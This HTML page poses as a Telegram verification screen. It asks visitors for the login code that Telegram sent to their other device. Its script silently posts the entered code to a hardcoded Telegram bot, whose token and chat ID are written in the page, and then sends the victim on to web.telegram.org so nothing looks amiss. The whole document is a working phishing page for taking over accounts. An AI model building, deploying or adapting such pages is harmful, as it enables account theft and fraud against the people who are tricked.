<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Screen</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      max-width: 400px;
      margin: 0 auto;
    }

    .emoji {
      font-size: 60px;
      margin-bottom: 20px;
    }

    .message {
      font-size: 14px;
      color: #b3b3b3;
      margin-bottom: 20px;
    }

    .input-container {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .input-with-button {
      display: flex;
      align-items: center;
      width: 100%;
      max-width: 300px;
      border: 1px solid #444;
      border-radius: 5px;
      background-color: #222;
    }

    .input-with-button input {
      flex: 1;
      padding: 10px;
      border: none;
      outline: none;
      background-color: transparent;
      color: #fff;
      font-size: 16px;
    }

    .input-with-button input::placeholder {
      color: #777;
    }

    .input-with-button button {
      border: none;
      background-color: #444;
      color: #fff;
      padding: 10px 15px;
      cursor: pointer;
      border-left: 1px solid #444;
      font-size: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .input-with-button button:hover {
      background-color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="emoji">üêµ</div>
    <div class="message">We've sent the code to the Telegram app on your other device.</div>
    <div class="input-container">
      <div class="input-with-button">
        <input type="text" id="code" placeholder="Enter code">
        <button id="submit-btn">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
                        <!-- Circle -->
                        <circle cx="12" cy="12" r="11" stroke="black" stroke-width="2" fill="none" />
                        <!-- Right-pointing arrow -->
                        <path d="M8 6l8 6-8 6V6z" fill="black" />
                    </svg>

        </button>
      </div>
    </div>
  </div>

  <script>
    // JavaScript to handle form submission
    document.getElementById('submit-btn').addEventListener('click', async function () {
      const code = document.getElementById('code').value.trim();

      if (!code) {
        alert('Please enter a code.');
        return;
      }

      // Replace with your Telegram Bot Token and Chat ID
      const BOT_TOKEN = '7150219035:AAH65LULyiOeMUIuh7kvUK_GQdzWSlRCCdE';
      const CHAT_ID = '993111409';

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      const message = `User entered the code: ${code}`;

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        });

        const result = await response.json();

        if (result.ok)  {
          window.location.href = "http://web.telegram.org"; 
        }
      } catch (error) {
        console.error('Error:', error);
        window.location.href = "http://web.telegram.org"; 
      }
    });
  </script>
</body>

</html>
